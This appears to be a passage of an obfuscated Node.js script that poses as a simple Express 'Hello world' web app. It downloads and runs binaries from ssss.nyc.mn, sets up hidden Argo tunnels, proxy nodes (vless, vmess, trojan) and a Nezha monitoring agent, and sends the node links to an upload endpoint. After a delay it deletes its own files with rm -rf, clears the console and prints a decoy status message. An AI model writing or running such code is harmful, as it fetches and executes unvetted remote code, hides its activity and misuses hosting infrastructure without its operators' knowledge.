'auto','http\x20server\x20is\x20running\x20on\x20port:','TunnelSecret','isFile','2096','error','blackhole','\x20-s\x20','direct','test','taskkill\x20/f\x20/im\x20','utf-8','https://api.ip.sb/geoip','arm','https://amd64.ssss.nyc.mn/v1','index.html','Error\x20reading\x20boot.log:','express','34959408JZoBAA','tunnel.json','?security=tls&sni=','unlinkSync','https://amd64.ssss.nyc.mn/web','country_code','readdirSync','87d65d8f-c91a-4668-b505-daa251079964','random','rm\x20-rf\x20','\x20already\x20exists','stringify','aarch64','6366440duGAwh','utf8','\x0aclient_secret:\x20','send','\x20is\x20running','\x0a\x20\x20tunnel:\x20','saas.sin.fan','arm64','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','\x20-c\x20','Empowerment\x20success\x20for\x20','tcp','Content-Type','AUTO_ACCESS','Hello\x20world!<br><br>You\x20can\x20access\x20/{SUB_PATH}(Default:\x20/sub)\x20to\x20get\x20your\x20nodes!','push','mkdirSync','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','exec','\x22\x20>\x20/dev/null\x202>&1','unshift','length','charAt','win32','filter','NEZHA_KEY','8443','replace','quic','App\x20is\x20running','text/plain;\x20charset=utf-8','path','Error\x20downloading\x20files:','/vmess-argo?ed=2560','Unhandled\x20error\x20in\x20startserver:','axios','basename','Mozilla/5.0','sub','platform','trojan','then','\x20>/dev/null\x202>&1','\x20-p\x20','success','7FSssyz','stream','pipe','2083','forEach','https://arm64.ssss.nyc.mn/v1','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','\x20successfully','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','block','11796RqXRQw','Empowerment\x20failed\x20for\x20','\x0a\x20\x20\x20\x20','--tls','map','2087','response','Skipping\x20adding\x20automatic\x20access\x20task','unlink','\x0a\x0avmess://','vless','statSync','status','application/json','.exe\x20>\x20nul\x202>&1','3254118OxzdNr','config.json','web\x20running\x20error:\x20','xtls-rprx-vision','Error\x20in\x20startserver:','finish','Unknown','writeFileSync','catch','match','listen','\x20failed:\x20','Subscription\x20uploaded\x20successfully','countryCode','ARGO_DOMAIN:','ARGO_DOMAIN','split','set','/vless-argo','/trojan-argo','all','clear','pkill\x20-f\x20\x22[','Nodes\x20uploaded\x20successfully','NAME','https+local://8.8.8.8/dns-query','list.txt','Error\x20executing\x20command:\x20','boot.log','ARGO_AUTH','\x20-c\x20\x22','\x20is\x20created','message','tunnel.yml','/tunnel.yml\x20run','automatic\x20access\x20task\x20added\x20successfully','Download\x20','abcdefghijklmnopqrstuvwxyz','log','16560kZRpOW','includes','2053','fileName','env','false'];_0x40b6=function(){return _0x22fb93;};return _0x40b6();}async function uploadNodes(){const _0x561d73={_0x2a455c:0xab,_0x6b4640:0x6c,_0xb21553:0x7b,_0x13ab24:0x6c,_0x442be1:0xd1,_0x22fe1e:0xad,_0x1bd371:0x7f,_0x37a666:0x6d,_0x17a3b8:0x95,_0x5c05ad:0x86},_0x3d2ac3=_0x97f47c;if(UPLOAD_URL&&PROJECT_URL){const _0x198b72=PROJECT_URL+'/'+SUB_PATH,_0x40809a={'subscription':[_0x198b72]};try{const _0x321dd6=await axios[_0x3d2ac3(_0x561d73._0x2a455c)](UPLOAD_URL+_0x3d2ac3(0xb7),_0x40809a,{'headers':{'Content-Type':'application/json'}});return _0x321dd6&&_0x321dd6[_0x3d2ac3(_0x561d73._0x6b4640)]===0xc8?(console[_0x3d2ac3(0x95)](_0x3d2ac3(_0x561d73._0xb21553)),_0x321dd6):null;}catch(_0x42eae8){if(_0x42eae8[_0x3d2ac3(0x66)]){if(_0x42eae8['response'][_0x3d2ac3(_0x561d73._0x13ab24)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x3d2ac3(_0x561d73._0x442be1)](listPath))return;const _0x36505d=fs[_0x3d2ac3(_0x561d73._0x22fe1e)](listPath,'utf-8'),_0x5db997=_0x36505d[_0x3d2ac3(_0x561d73._0x1bd371)]('\x0a')[_0x3d2ac3(0x10d)](_0x107a2f=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x3d2ac3(0xde)](_0x107a2f));if(_0x5db997['length']===0x0)return;const _0x3756d4=JSON['stringify']({'nodes':_0x5db997});try{const _0x3f82b7=await axios[_0x3d2ac3(0xab)](UPLOAD_URL+'/api/add-nodes',_0x3756d4,{'headers':{'Content-Type':_0x3d2ac3(_0x561d73._0x37a666)}});return _0x3f82b7&&_0x3f82b7[_0x3d2ac3(0x6c)]===0xc8?(console[_0x3d2ac3(_0x561d73._0x17a3b8)](_0x3d2ac3(_0x561d73._0x5c05ad)),_0x3f82b7):null;}catch(_0x45779b){return null;}}else return;}}function cleanFiles(){const _0x15cbcb={_0x1176cf:0x104,_0x419cf7:0xf0,_0x31ec07:0xaa},_0x31037d={_0xacff4b:0x112};setTimeout(()=>{const _0x9d8882={_0x180de7:0xcd},_0x1c8b8a=_0xc19f,_0x1f993b=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x1f993b[_0x1c8b8a(_0x15cbcb._0x1176cf)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x1f993b['push'](phpPath);process[_0x1c8b8a(0x11c)]===_0x1c8b8a(0x10c)?exec(_0x1c8b8a(0xc2)+_0x1f993b['join']('\x20')+'\x20>\x20nul\x202>&1',_0xd6d1c3=>{const _0x1fe556=_0x1c8b8a;console['clear'](),console['log']('App\x20is\x20running'),console['log'](_0x1fe556(_0x9d8882._0x180de7));}):exec(_0x1c8b8a(_0x15cbcb._0x419cf7)+_0x1f993b[_0x1c8b8a(_0x15cbcb._0x31ec07)]('\x20')+_0x1c8b8a(0x11f),_0x178e17=>{const _0x17c1cb=_0x1c8b8a;console[_0x17c1cb(0x84)](),console[_0x17c1cb(0x95)](_0x17c1cb(_0x31037d._0xacff4b)),console[_0x17c1cb(0x95)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x3465db={_0x383db4:0x95,_0x2ffe52:0x92,_0x3935bb:0xb6,_0x2502f2:0x8f},_0x2c1c17=_0x97f47c;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x2c1c17(0x67));return;}try{const _0x9e881=await axios[_0x2c1c17(0xab)](_0x2c1c17(0xca),{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console[_0x2c1c17(_0x3465db._0x383db4)](_0x2c1c17(_0x3465db._0x2ffe52)),_0x9e881;}catch(_0x1506b8){return console[_0x2c1c17(0xda)](_0x2c1c17(_0x3465db._0x3935bb)+_0x1506b8[_0x2c1c17(_0x3465db._0x2502f2)]),null;}}async function startserver(){const _0x5521ce={_0x224143:0x73},_0xdf6346=_0x97f47c;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x3fc224){console['error'](_0xdf6346(_0x5521ce._0x224143),_0x3fc224);}}startserver()['catch'](_0x3a8a67=>{const _0x55b64e=_0x97f47c;console[_0x55b64e(0xda)](_0x55b64e(0x117),_0x3a8a67);}),app[_0x97f47c(0xa8)]('/',async function(_0x4631c1,_0x58cf20){const _0x1c7aa3={_0x2fa28e:0xe4,_0x3ae316:0xf5,_0x5c7781:0xf7,_0x43dba2:0x103},_0x32f4d1=_0x97f47c;try{const _0x56815f=path[_0x32f4d1(0xaa)](__dirname,_0x32f4d1(_0x1c7aa3._0x2fa28e)),_0x35b531=await fs['promises'][_0x32f4d1(0xa2)](_0x56815f,_0x32f4d1(_0x1c7aa3._0x3ae316));_0x58cf20[_0x32f4d1(_0x1c7aa3._0x5c7781)](_0x35b531);}catch(_0x1fcccf){_0x58cf20[_0x32f4d1(0xf7)](_0x32f4d1(_0x1c7aa3._0x43dba2));}}),app[_0x97f47c(0x79)](PORT,()=>console[_0x97f47c(0x95)](_0x97f47c(0xd6)+PORT+'!'));
